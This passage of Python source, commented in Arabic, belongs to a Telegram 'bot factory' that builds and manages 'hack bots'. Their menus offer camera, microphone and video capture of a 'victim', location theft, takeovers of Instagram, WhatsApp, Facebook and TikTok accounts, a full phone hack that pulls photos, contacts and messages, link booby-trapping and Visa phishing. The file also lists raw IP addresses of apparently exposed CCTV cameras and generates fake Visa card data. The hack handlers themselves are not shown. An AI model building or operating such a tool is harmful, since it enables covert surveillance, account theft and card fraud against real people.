            f"🔗 العنوان الأول: `{network.network_address + 1}`\n"
            f"🔗 العنوان الأخير: `{network.broadcast_address - 1}`"
        )
    except Exception as e:
        return f"❌ خطأ: {e}"


# =============================================
# Radio, CCTV, Fake Data
# =============================================
SUDAN_RADIO_STATIONS = [
    {"name": "#Radio Quran 🕋", "url": "https://n0a.radiojar.com/0tpy1h0kxtzuv?rj-ttl=5&rj-tok=AAABhdgGORQA-2acfyF3_4WY2g"},
    {"name": "Abdulbasit Abdulsamad 🎙️", "url": "https://radio.mp3islam.com/listen/abdulbasit/radio.mp3"},
    {"name": "Dabanga Radio 📻", "url": "https://stream.dabangasudan.org/"},
    {"name": "Dial Radio 📡", "url": "https://cast.dialradio.live/stream.aac"},
]

EGYPT_RADIO_STATIONS = [
    {"name": "إذاعة مشاري العفاسي 🕌", "url": "https://qurango.net/radio/mishary_alafasi"},
    {"name": "---تراتيل قصيرة متميزة--- ✨", "url": "https://qurango.net/radio/tarateel"},
    {"name": ". beautiful recitation 🎶", "url": "https://qurango.net/radio/salma"},
    {"name": ". القارئ محمد أيوب 🎤", "url": "https://qurango.net/radio/mohammed_ayyub"},
    {"name": ".. مختصر التفسير 📚", "url": "https://qurango.net/radio/mukhtasartafsir"},
    {"name": ".إذاعة ماهر المعيقلي 🕋", "url": "https://backup.qurango.net/radio/maher"},
    {"name": "87.8 Mix FM 🎧", "url": "https://stream-29.zeno.fm/na3vpvn10qruv"},
    {"name": "90s FM 📻", "url": "http://eu1.fastcast4u.com/proxy/prontofm"},
    {"name": "90s FM 🎶", "url": "https://fastcast4u.com/player/prontofm/?pl=vlc&c=0"},
    {"name": "92.7 Mega FM 🔊", "url": "http://nebula.shoutca.st:8211/mp3"},
    {"name": "Abdulbasit Abdulsamad 🎙️", "url": "https://radio.mp3islam.com/listen/abdulbasit/radio.mp3"},
    {"name": "Abdulrasheet Soufi 🎤", "url": "https://qurango.net/radio/abdulrasheed_soufi_assosi.mp3"},
    {"name": "Amr Diab Radio 🎵", "url": "https://stream-40.zeno.fm/xa4yhh4k838uv?zs=gojgaFRaRrK1wgGIwdv6xA"},
    {"name": "Arab Mix 256 🎧", "url": "https://stream.zeno.fm/wvqgc9kb1d0uv"},
    {"name": "Arab Mix FM 📻", "url": "https://stream.zeno.fm/na3vpvn10qruv"},
    {"name": "Arina 🎶", "url": "https://stream.zeno.fm/o9hxduybuoiuv"},
    {"name": "As0m 🔊", "url": "https://stream.zeno.fm/o9hxduybuoiuv"},
    {"name": "c- tv coptic chanl 📺", "url": "https://58cc65c534c67.streamlock.net/ctvchannel.tv/ctv.smil/chunklist_w555483697_b1728000_slar_t64SEQ=.m3u8"},
    {"name": "C-TV Coptic Channel 📡", "url": "https://58cc65c534c67.streamlock.net/ctvchannel.tv/ctv.smil/chunklist_w555483697_b1728000_slar_t64SEQ=.m3u8"},
    {"name": "Coptic Voice Radio 🎙️", "url": "http://stream.clicdomain.com.br:5828/;"},
    {"name": "Diab FM 🎵", "url": "http://stream-36.zeno.fm/rf64mx02qa0uv?zs=omRb6KEjQ3u0-JsaJKdhQg"},
    {"name": "Diab FM 🎧", "url": "https://stream-34.zeno.fm/rf64mx02qa0uv?zs=-xjlLLwRSuKrffFxK4vLA"},
    {"name": "El Gouna Radio 🏖️", "url": "http://online-radio.eu/export/winamp/9080-el-gouna-radio"},
    {"name": "El Gouna Radio 🌊", "url": "http://82.201.132.237:8000/"},
    {"name": "El Gouna Radio ☀️", "url": "http://82.201.132.237:8000/;"},
    {"name": "Elissa FM 🎤", "url": "https://stream.zeno.fm/v7n499m8ckhvv"},
    {"name": "IVIeshal 🎶", "url": "https://stream.zeno.fm/smdswgy1rbmtv"},
    {"name": "MAHATET MASR 🚉", "url": "https://s3.radio.co/s9cb11828c/listen"},
    {"name": "MEGA FM 🔊", "url": "http://nebula.shoutca.st:8211/mp3"},
    {"name": "Misrin Street 🛣️", "url": "https://stream.zeno.fm/djqjrjhxsrgtv"},
    {"name": "MOON.BEATS 🌕", "url": "https://stream.zeno.fm/o9hxduybuoiuv"},
    {"name": "Nile FM 🏞️", "url": "https://audio.nrpstream.com/public/nile_fm/playlist.pls"},
    {"name": "NileFM 🇪🇬", "url": "https://audio.nrpstream.com/listen/nile_fm/radio.mp3"},
    {"name": "Nogoum fm ⭐", "url": "https://audio.nrpstream.com/listen/nogoumfm/radio.mp3?refresh=1675929443955"},
    {"name": "Nogoum FM 🌟", "url": "https://audio.nrpstream.com/listen/nogoumfm/radio.mp3?refresh=1668723970691"},
    {"name": "Nogoum FM 💫", "url": "https://audio.nrpstream.com/listen/nogoumfm/radio.mp3"},
    {"name": "NRJ EGYPT ⚡", "url": "http://nrjstreaming.ahmed-melege.com/nrjegypt"},
    {"name": "On Sport FM ⚽", "url": "https://carina.streamerr.co:2020/stream/OnSportFM"},
    {"name": "On sports FM 🏆", "url": "https://carina.streamerr.co:2020/stream/OnSportFM"},
    {"name": "Radio 9090 📻", "url": "https://9090streaming.mobtada.com/9090FMEGYPT"},
]

CCTV_CAMERAS = {
    "الولايات المتحدة 🇺🇸": [
        "https://www.earthcam.com/usa/newyork/timessquare/",
        "http://www.insecam.org/cam/bycountry/US/",
        "https://www.webcamtaxi.com/en/usa.html",
    ],
    "ألمانيا 🇩🇪": [
        "http://84.35.147.6:80",
        "http://185.125.234.119:8082",
        "http://217.103.90.117:8098",
        "http://77.250.189.154:82",
        "http://89.99.162.183:80",
        "http://85.204.109.102:8080",
        "http://213.233.251.55:8080",
        "http://77.160.68.211:8000",
        "http://77.169.191.156:80",
        "http://77.162.93.116:80",
        "http://62.133.72.183:80",
        "http://91.201.127.150:8081",
        "http://62.133.72.177:80",
        "http://62.133.72.173:80",
        "http://80.61.63.103:81",
        "http://213.124.36.2:80",
        "http://91.201.127.150:8080",
        "http://87.195.26.45:80",
        "http://213.124.95.98:8082",
        "http://217.100.243.178:10000",
        "http://89.250.177.22:80",
        "http://185.64.122.250:8081",
        "http://185.64.122.242:8082",
        "http://185.64.121.186:8081",
        "http://213.154.234.197:80",
        "http://213.154.234.194:80",
        "http://95.97.10.38:8080",
        "http://90.145.45.197:80",
        "http://62.131.207.209:8080",
        "http://217.63.79.153:8081",
        "http://213.126.79.10:80",
        "http://193.173.111.26:80",
        "http://86.92.91.44:80",
    ],
}


def generate_random_visa_details():
    return {
        "card_number": "4" + ''.join(random.choices(string.digits, k=15)),
        "expiry": f"{str(random.randint(1, 12)).zfill(2)}/{random.randint(2024, 2030)}",
        "cvv": ''.join(random.choices(string.digits, k=3)),
        "bank": random.choice(["SunTrust Bank", "Bank of America", "Chase Bank", "Wells Fargo", "Citibank"]),
        "card_type": random.choice(["VISA DEBIT CLASSIC", "VISA CREDIT PLATINUM", "VISA PREPAID ELECTRON"]),
        "country": random.choice(["USA🇺🇸", "Canada🇨🇦", "UK🇬🇧", "Australia🇦🇺", "Germany🇩🇪"]),
        "value": f"${random.randint(10, 1000)}"
    }


def generate_fake_number_details():
    return {
        "phone_number": f"+{random.randint(1, 999)}{random.randint(100000000, 999999999)}",
        "country": random.choice(["الولايات المتحدة 🇺🇸", "كندا 🇨🇦", "المملكة المتحدة 🇬🇧", "ألمانيا 🇩🇪", "فرنسا 🇫🇷", "مصر 🇪🇬", "السعودية 🇸🇦"]),
        "platform": random.choice(["WhatsApp", "Telegram", "Signal", "Viber", "SMS"]),
        "creation_date": f"{random.randint(1, 28)}/{random.randint(1, 12)}/{random.randint(2020, 2023)}"
    }


def check_username_availability(bot_token, username):
    try:
        resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getChat?chat_id=@{username}").json()
        if resp.get("ok"):
            return False
        return resp.get("error_code") == 400 and "chat not found" in resp.get("description", "").lower()
    except:
        return False


def generate_and_check_username(bot_token, username_type):
    chars = string.ascii_lowercase + string.digits
    for _ in range(50):
        username = ""
        if username_type == "single_type":
            char = random.choice(string.ascii_lowercase)
            username = char * 4 if random.choice([True, False]) else ''.join(
                random.choice(string.ascii_lowercase + string.digits) for _ in range(4)
            )
        elif username_type == "quad_usernames":
            username = ''.join(random.choice(chars) for _ in range(4))
        elif username_type == "semi_quad":
            parts = [random.choice(chars) for _ in range(3)]
            username = f"{parts[0]}{parts[1]}_{parts[2]}" if random.choice([True, False]) else f"{parts[0]}_{parts[1]}{parts[2]}"
        elif username_type == "semi_triple":
            parts = [random.choice(chars) for _ in range(2)]
            username = f"{parts[0]}_{parts[1]}"
        elif username_type == "random":
            length = random.randint(4, 8)
            username = ''.join(random.choice(chars) for _ in range(length))
        elif username_type == "unique":
            choice = random.choice([1, 2, 3, 4])
            if choice == 1:
                username = ''.join(random.choice(string.ascii_lowercase) for _ in range(4))
            elif choice == 2:
                username = ''.join(random.choice(string.digits) for _ in range(4))
            elif choice == 3:
                username = random.choice(string.ascii_lowercase) * 3 + random.choice(string.digits)
            else:
                username = random.choice(string.ascii_lowercase) + random.choice(string.digits) * 3

        if check_username_availability(bot_token, username):
            return username
        time.sleep(0.1)
    return None


# =============================================
# Keyboard Functions
# =============================================
def get_main_bot_user_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✨ أنشئ بوت جديد 🤖", callback_data="create_bot")],
        [InlineKeyboardButton("🛠 بوتاتك", callback_data="manage_bots")]
    ])


def get_main_bot_admin_keyboard():
    subscription_text = "✅ إزالة الاشتراك الإجباري" if FACTORY_MAIN_SUBSCRIPTION_ENABLED else "➕ إضافة الاشتراك الإجباري"
    subscription_callback = "remove_factory_main_sub" if FACTORY_MAIN_SUBSCRIPTION_ENABLED else "add_factory_main_sub"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✨ أنشئ بوت جديد 🤖", callback_data="create_bot"),
         InlineKeyboardButton("🛠 بوتاتك", callback_data="manage_bots")],
        [InlineKeyboardButton("➕ إضافة أدمن 👨‍💻", callback_data="add_factory_admin"),
         InlineKeyboardButton("🗑️ حذف أدمن", callback_data="remove_factory_admin")],
        [InlineKeyboardButton("📊 إحصائيات المصنع", callback_data="factory_stats")],
        [InlineKeyboardButton("🛑 إيقاف جميع البوتات", callback_data="stop_all_bots"),
         InlineKeyboardButton("🟢 فتح جميع البوتات", callback_data="start_all_bots")],
        [InlineKeyboardButton("📢 إذاعة للبوتات المجانية", callback_data="broadcast_free_bots")],
        [InlineKeyboardButton(subscription_text, callback_data=subscription_callback)]
    ])


def get_admin_keyboard(bot_username, user_id, bot_type):
    load_made_bot_settings(bot_username)
    bot_settings = made_bot_data[bot_username]

    keyboard = [
        [InlineKeyboardButton("المشتركون 👥", callback_data="m1")],
        [InlineKeyboardButton("إذاعة رسالة 📮", callback_data="send"),
         InlineKeyboardButton("توجيه رسالة 🔄", callback_data="forward")],
        [InlineKeyboardButton("اشتراك إجباري 💢", callback_data="ach"),
         InlineKeyboardButton("حذف اشتراك 🔱", callback_data="dch")],
        [InlineKeyboardButton("تفعيل التنبيهات ✔️", callback_data="ons"),
         InlineKeyboardButton("تعطيل التنبيهات ❎", callback_data="ofs")],
        [InlineKeyboardButton("فتح البوت ✅", callback_data="obot"),
         InlineKeyboardButton("إيقاف البوت ❌", callback_data="ofbot")],
        [InlineKeyboardButton("وضع مدفوع 💰", callback_data="pro"),
         InlineKeyboardButton("وضع مجاني 🆓", callback_data="frre")],
        [InlineKeyboardButton("إضافة مدفوع 💰", callback_data="pro123"),
         InlineKeyboardButton("إزالة مدفوع 🆓", callback_data="frre123")],
        [InlineKeyboardButton("حظر 🚫", callback_data="ban"),
         InlineKeyboardButton("إلغاء حظر ❌", callback_data="unban")],
        [InlineKeyboardButton("تغيير رسالة البدء 📝", callback_data="set_start_message")],
        [InlineKeyboardButton("تحميل البيانات 💾", callback_data="download_bot_data")]
    ]

    if bot_type == "hack_bot":
        keyboard.append([InlineKeyboardButton("نقاط البايلود 🔢", callback_data="set_payload_points")])
        if bot_settings.get("custom_buttons_enabled_by_admin", False):
            keyboard.append([InlineKeyboardButton("الأزرار 🖲️", callback_data="buttons_panel")])
    elif bot_type == "encryption_bot":
        keyboard.append([InlineKeyboardButton("القناة الأساسية 🫅", callback_data="set_main_channel_link")])
    elif bot_type == "factory_bot":
        keyboard.extend([
            [InlineKeyboardButton("✨ أنشئ بوت جديد 🤖", callback_data="create_bot_from_factory")],
            [InlineKeyboardButton("🛠 بوتاتك المصنوعة", callback_data="manage_made_bots_from_factory")],
            [InlineKeyboardButton("➕ إضافة أدمن 👨‍💻", callback_data="add_factory_admin_sub")],
            [InlineKeyboardButton("🗑️ حذف أدمن", callback_data="remove_factory_admin_sub")],
            [InlineKeyboardButton("📊 إحصائيات", callback_data="factory_sub_stats")],
            [InlineKeyboardButton("📢 إذاعة", callback_data="broadcast_free_bots_sub")],
            [InlineKeyboardButton("➕ مميزات مدفوعة 💎", callback_data="add_paid_features_sub")]
        ])

    return InlineKeyboardMarkup(keyboard)


def get_user_keyboard(admin_id, bot_username, user_id, bot_type):
    load_made_bot_settings(bot_username)
    bot_settings = made_bot_data[bot_username]

    if bot_type == "hack_bot":
        keyboard = [
            [InlineKeyboardButton("🔍 فحص عنوان IP", callback_data="tool_ip_lookup"),
             InlineKeyboardButton("🌐 فحص النطاق", callback_data="tool_domain_info")],
            [InlineKeyboardButton("🔒 فحص SSL", callback_data="tool_ssl_check"),
             InlineKeyboardButton("🛡️ فحص رؤوس HTTP", callback_data="tool_http_headers")],
            [InlineKeyboardButton("📡 فحص البورتات", callback_data="tool_port_scan"),
             InlineKeyboardButton("🔎 النطاقات الفرعية", callback_data="tool_subdomains")],
            [InlineKeyboardButton("📋 Whois Lookup", callback_data="tool_whois"),
             InlineKeyboardButton("🌐 فحص DNS", callback_data="tool_dns")],
            [InlineKeyboardButton("📧 فحص البريد", callback_data="tool_email_check"),
             InlineKeyboardButton("👤 البحث عن يوزر OSINT", callback_data="tool_username_osint")],
            [InlineKeyboardButton("🔍 Google Dork", callback_data="tool_google_dork"),
             InlineKeyboardButton("🔐 مولد كلمات مرور", callback_data="tool_password_gen")],
            [InlineKeyboardButton("🛡️ حساب الهاش", callback_data="tool_hash_calc"),
             InlineKeyboardButton("📱 مولد QR Code", callback_data="tool_qr_gen")],
            [InlineKeyboardButton("🔗 تشفير URL", callback_data="tool_url_encode"),
             InlineKeyboardButton("🔠 Base64", callback_data="tool_base64")],
            [InlineKeyboardButton("🏭 فحص MAC Address", callback_data="tool_mac_lookup"),
             InlineKeyboardButton("📡 Ping", callback_data="tool_ping")],
            [InlineKeyboardButton("🗺️ Traceroute", callback_data="tool_traceroute"),
             InlineKeyboardButton("🌐 معلومات CIDR", callback_data="tool_cidr")],
            [InlineKeyboardButton("اختراق الكاميرا الخلفية 📸", callback_data="cam_back"),
             InlineKeyboardButton("اختراق الكاميرا الأمامية 📸", callback_data="cam_front")],
            [InlineKeyboardButton("تسجيل صوت الضحية 🎤", callback_data="mic_record"),
             InlineKeyboardButton("اختراق الموقع 📍", callback_data="location")],
            [InlineKeyboardButton("تسجيل فيديو الضحية 🎥", callback_data="record_video"),
             InlineKeyboardButton("اختراق كاميرات المراقبة 📡", callback_data="surveillance_cams")],
            [InlineKeyboardButton("اختراق انستغرام 💻", callback_data="insta_hack"),
             InlineKeyboardButton("اختراق واتساب 🟢", callback_data="whatsapp_hack")],
            [InlineKeyboardButton("اختراق ببجي 🎮", callback_data="pubg_hack"),
             InlineKeyboardButton("اختراق فيسبوك 🟣", callback_data="facebook_hack")],
            [InlineKeyboardButton("اختراق سناب شات ⭐", callback_data="snapchat_hack"),
             InlineKeyboardButton("اختراق فري فاير 👾", callback_data="ff_hack")],
            [InlineKeyboardButton("الذكاء الاصطناعي 🤖", callback_data="user_button_ai"),
             InlineKeyboardButton("تفسير الأحلام 🧙", callback_data="user_button_dream_interpret")],
            [InlineKeyboardButton("لعبة المارد الأزرق 🧞", callback_data="user_button_blue_genie_game"),
             InlineKeyboardButton("البحث عن الصور 🎨", callback_data="user_button_image_search")],
            [InlineKeyboardButton("تحويل النص إلى صوت 🔄", callback_data="user_button_text_to_speech"),
             InlineKeyboardButton("أذكار إسلامية 🕌", callback_data="user_button_azkar")],
            [InlineKeyboardButton("شيرين AI 🎤", callback_data="user_button_shereen_ai"),
             InlineKeyboardButton("ديب سيك 🧠", callback_data="user_button_deepseek_ai")],
            [InlineKeyboardButton("ChatGPT-3.5 💬", callback_data="user_button_chatgpt_3_5")],
            [InlineKeyboardButton("اختراق تيك توك 🟧", callback_data="tiktok_hack"),
             InlineKeyboardButton("جمع معلومات الجهاز 🔬", callback_data="device_info")],
            [InlineKeyboardButton("اختراق الهاتف بالكامل 🔞", callback_data="user_button_full_phone_hack")],
            [InlineKeyboardButton("تلغيم الروابط ⚠️", callback_data="user_button_link_exploit")],
            [InlineKeyboardButton("لعبة ذكية 🧠", callback_data="user_button_smart_game"),
             InlineKeyboardButton("صور عالية الدقة 🖼️", callback_data="high_quality_shot")],
            [InlineKeyboardButton("أرقام وهمية ☎️", callback_data="user_button_fake_numbers")],
            [InlineKeyboardButton("تصيد فيزا 💳", callback_data="user_button_visa_phishing"),
             InlineKeyboardButton("رقم الضحية 📲", callback_data="get_victim_number")],
            [InlineKeyboardButton("اختراق بث الراديو 📻", callback_data="user_button_radio_hack"),
             InlineKeyboardButton("فحص الروابط 🖌️", callback_data="user_button_link_check")],
            [InlineKeyboardButton("زخرفة الأسماء 🗿", callback_data="user_button_name_decorate"),
             InlineKeyboardButton("صيد يوزرات 💍", callback_data="telegram_usernames_menu")],
            [InlineKeyboardButton("تواصل مع المطور 👨‍🎓", url=f"tg://user?id={admin_id}")]
        ]

        if bot_settings.get("custom_buttons_enabled_by_admin", False):
            for btn in bot_settings["custom_buttons"]:
                if btn["type"] in ["external_link", "internal_link"]:
                    keyboard.append([InlineKeyboardButton(btn["name"], url=btn["value"])])
                elif btn["type"] == "send_message":
                    keyboard.append([InlineKeyboardButton(btn["name"], callback_data=f"custom_msg_btn_{btn['name']}")])

    elif bot_type == "encryption_bot":
        keyboard = [
            [InlineKeyboardButton("✥تشفير ملفات🔒", callback_data="encrypt_file")],
            [InlineKeyboardButton("✥فك تشفير ملفات🔓", callback_data="decrypt_file")],
            [InlineKeyboardButton("✥الدعم🚨", url=f"tg://user?id={admin_id}")],
            [InlineKeyboardButton("✥الشروط و المتطلبات📜", callback_data="show_terms_encryption_bot")]
        ]
        if bot_settings.get("main_channel_link"):
            keyboard.append([InlineKeyboardButton("✥القناة الأساسية🫅", url=bot_settings["main_channel_link"])])
        else:
            keyboard.append([InlineKeyboardButton("✥القناة الأساسية🫅", callback_data="no_main_channel_set")])

    elif bot_type == "factory_bot":
        keyboard = [
            [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot_sub")],
            [InlineKeyboardButton("🔐 بوت تشفير py", callback_data="create_encryption_bot_sub")]
        ]

    return InlineKeyboardMarkup(keyboard)


def get_full_phone_hack_keyboard(bot_username, user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("سحب الصور🔒", callback_data="full_phone_hack_photos")],
        [InlineKeyboardButton("سحب الأرقام🔒", callback_data="full_phone_hack_contacts")],
        [InlineKeyboardButton("سحب الرسائل🔒", callback_data="full_phone_hack_messages")],
        [InlineKeyboardButton("تنفيذ أوامر🔒", callback_data="full_phone_hack_commands")],
        [InlineKeyboardButton("اختراق الجهاز🔒", callback_data="full_phone_hack_device")],
        [InlineKeyboardButton("رجوع", callback_data="back_to_main_user_menu")]
    ])


def get_fake_number_keyboard(bot_username, user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("طلب كود 💬", callback_data="fake_number_request_code")],
        [InlineKeyboardButton("تغيير الرقم 🔄", callback_data="fake_number_change_number")],
    ])


# =============================================
# Made Bot Runner
# =============================================
def run_made_bot(bot_token, admin_id, bot_username, bot_type):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(_run_made_bot_async(bot_token, admin_id, bot_username, bot_type))
    except Exception as e:
        logging.error(f"Error running made bot @{bot_username}: {e}")


async def _run_made_bot_async(bot_token, admin_id, bot_username, bot_type):
    try:
        app = ApplicationBuilder().token(bot_token).build()
        app.add_handler(CommandHandler("start", start_made_bot))
        app.add_handler(CallbackQueryHandler(handle_callback_query_made_bot))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message_made_bot))
        app.add_handler(MessageHandler(filters.Document.ALL, handle_document_made_bot))
        logging.info(f"Starting made bot @{bot_username}...")
        await app.initialize()
        await app.start()
        await app.updater.start_polling(drop_pending_updates=True)
        logging.info(f"Made bot @{bot_username} is running!")
        await asyncio.Event().wait()
    except Exception as e:
        logging.error(f"Error in made bot @{bot_username}: {e}")


# =============================================
# Main Bot Handlers
# =============================================
async def start_main_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in FACTORY_ADMINS:
        await send_msg(
            context.bot, user_id,
            "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @xtt1x\nقناة المطور: @xtt11x",
            reply_markup=get_main_bot_admin_keyboard()
        )
        user_state[user_id] = None
        return

    if check_subscription(user_id, MAIN_CHANNELS, MAIN_BOT_TOKEN):
        await send_msg(
            context.bot, user_id,
            "👋 حياك الله في بوت صانع البوتات ✨\n\nالمطور: @xtt1x\nقناة المطور: @xtt11x",
            reply_markup=get_main_bot_user_keyboard()
        )
        user_state[user_id] = None
    else:
        channel_list = "\n".join([f"🔗 {channel}" for channel in MAIN_CHANNELS])
        msg = f"❌ عذراً، يجب عليك الاشتراك في القنوات التالية أولاً:\n\n{channel_list}\n\nبعد الاشتراك أرسل /start"
        await update.message.reply_text(msg)


async def create_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot")],
        [InlineKeyboardButton("🔐 بوت تشفير py", callback_data="create_encryption_bot")],
        [InlineKeyboardButton("🎩 مصنع بوتات", callback_data="create_factory_bot")]
    ]
    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "اختر نوع البوت:", reply_markup=InlineKeyboardMarkup(keyboard))
    user_state[query.from_user.id] = "await_bot_type_selection"


async def create_hack_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "📝 أرسل توكن البوت الذي حصلت عليه من BotFather:")
    user_state[query.from_user.id] = {"action": "await_token", "bot_type": "hack_bot"}


async def create_encryption_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "📝 أرسل توكن البوت الذي حصلت عليه من BotFather:")
    user_state[query.from_user.id] = {"action": "await_token", "bot_type": "encryption_bot"}


async def create_factory_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if FACTORY_MAIN_SUBSCRIPTION_ENABLED and not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
        keyboard = [[InlineKeyboardButton("اشتراك", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
        await edit_msg(context.bot, query.message.chat.id, query.message.message_id, f"❌ عذراً، يجب عليك الاشتراك في {FACTORY_MAIN_SUBSCRIPTION_CHANNEL} أولاً", reply_markup=InlineKeyboardMarkup(keyboard))
        user_state[user_id] = None
        return
    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "📝 أرسل توكن البوت الذي حصلت عليه من BotFather:")
    user_state[user_id] = {"action": "await_token", "bot_type": "factory_bot"}


async def manage_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    bots = created_bots.get(user_id, [])
    if not bots:
        await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "⚠️ ليس لديك أي بوتات بعد.")
        return
    keyboard = [[InlineKeyboardButton(f"🤖 {bot['username']} ({bot['bot_type']})", callback_data=f"info_{bot['username']}")] for bot in bots]
    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "بوتاتك:", reply_markup=InlineKeyboardMarkup(keyboard))
    user_state[user_id] = "manage_bots"


async def bot_info_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    bot_username = query.data.split("_", 1)[1]
    keyboard = [
        [InlineKeyboardButton("🗑 حذف البوت", callback_data=f"delete_{bot_username}")]
    ]
    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, f"معلومات @{bot_username}", reply_markup=InlineKeyboardMarkup(keyboard))
    user_state[query.from_user.id] = f"confirm_delete_{bot_username}"


async def delete_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    bot_username = query.data.split("_", 1)[1]
    user_state[query.from_user.id] = f"confirm_delete_{bot_username}"
    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, f"⚠️ هل أنت متأكد من حذف @{bot_username}؟\nأرسل: `delete {bot_username}` للتأكيد", parse_mode=ParseMode.MARKDOWN)


async def add_factory_admin_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    if query.from_user.id != MAIN_ADMIN_ID:
        await query.answer("🚫 ليس لديك صلاحية", show_alert=True)
        return
    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "📝 أرسل معرف المستخدم (ID) للإضافة:")
    user_state[query.from_user.id] = "await_new_factory_admin_id"


async def remove_factory_admin_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    if query.from_user.id != MAIN_ADMIN_ID:
        await query.answer("🚫 ليس لديك صلاحية", show_alert=True)
        return
    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "📝 أرسل معرف المستخدم (ID) للحذف:")
    user_state[query.from_user.id] = "await_remove_factory_admin_id"


async def factory_stats_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    total_bots = sum(len(bots) for bots in created_bots.values())
    total_users = sum(len(made_bot_data.get(b, {}).get("members", [])) for b in made_bot_data)
    msg = (
        f"📊 إحصائيات المصنع:\n\n"
        f"🤖 إجمالي البوتات: {total_bots}\n"
        f"👥 إجمالي المستخدمين: {total_users}\n"
        f"👨‍💻 عدد الأدمنز: {len(FACTORY_ADMINS)}"
    )
    await send_msg(context.bot, query.message.chat.id, msg, parse_mode=ParseMode.MARKDOWN)


async def stop_all_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer("جاري إيقاف جميع البوتات...", show_alert=True)
    stopped = False
    for bot_name, updater in list(running_made_bot_updaters.items()):
        try:
            updater.stop()
            del running_made_bot_updaters[bot_name]
            stopped = True
        except Exception as e:
            logging.error(f"Error stopping bot {bot_name}: {e}")
    if stopped:
        await send_msg(context.bot, query.message.chat.id, "✅ تم إيقاف جميع البوتات.")
    else:
        await send_msg(context.bot, query.message.chat.id, "⚠️ لا توجد بوتات قيد التشغيل.")


async def start_all_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer("جاري تشغيل جميع البوتات...", show_alert=True)
    started = False
    for admin_id, bots in created_bots.items():
        for bot_info in bots:
            if bot_info["username"] not in running_made_bot_updaters:
                try:
                    threading.Thread(
                        target=run_made_bot,
                        args=(bot_info["token"], bot_info["admin_id"], bot_info["username"], bot_info["bot_type"]),
                        daemon=True
                    ).start()
                    started = True
                except Exception as e:
                    logging.error(f"Error starting bot {bot_info['username']}: {e}")
    if started:
        await send_msg(context.bot, query.message.chat.id, "✅ جاري تشغيل جميع البوتات.")
    else:
        await send_msg(context.bot, query.message.chat.id, "⚠️ لا توجد بوتات للتشغيل.")


async def broadcast_free_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    await send_msg(context.bot, query.message.chat.id, "📝 أرسل الرسالة للإذاعة لجميع البوتات المجانية:")
    user_state[query.from_user.id] = "await_broadcast_free_bots_message"


async def add_factory_main_subscription(update: Update, context: CallbackContext):
    global FACTORY_MAIN_SUBSCRIPTION_ENABLED
    query = update.callback_query
    await query.answer("جاري تفعيل الاشتراك الإجباري...", show_alert=True)
    FACTORY_MAIN_SUBSCRIPTION_ENABLED = True
    for bot_username in made_bot_data:
        load_made_bot_settings(bot_username)
        if FACTORY_MAIN_SUBSCRIPTION_CHANNEL not in made_bot_data[bot_username]["channels"]:
            made_bot_data[bot_username]["channels"].append(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
            save_made_bot_settings(bot_username)
    await send_msg(context.bot, query.message.chat.id, "✅ تم تفعيل الاشتراك الإجباري للمصنع.")
    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨", reply_markup=get_main_bot_admin_keyboard())


async def remove_factory_main_subscription(update: Update, context: CallbackContext):
    global FACTORY_MAIN_SUBSCRIPTION_ENABLED
    query = update.callback_query
    await query.answer("جاري إزالة الاشتراك الإجباري...", show_alert=True)
    FACTORY_MAIN_SUBSCRIPTION_ENABLED = False
    for bot_username in made_bot_data:
        load_made_bot_settings(bot_username)
        if FACTORY_MAIN_SUBSCRIPTION_CHANNEL in made_bot_data[bot_username]["channels"]:
            made_bot_data[bot_username]["channels"].remove(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
            save_made_bot_settings(bot_username)
    await send_msg(context.bot, query.message.chat.id, "✅ تم إزالة الاشتراك الإجباري للمصنع.")
    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨", reply_markup=get_main_bot_admin_keyboard())


async def handle_message_main_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    state = user_state.get(user_id)
    text = update.message.text.strip()

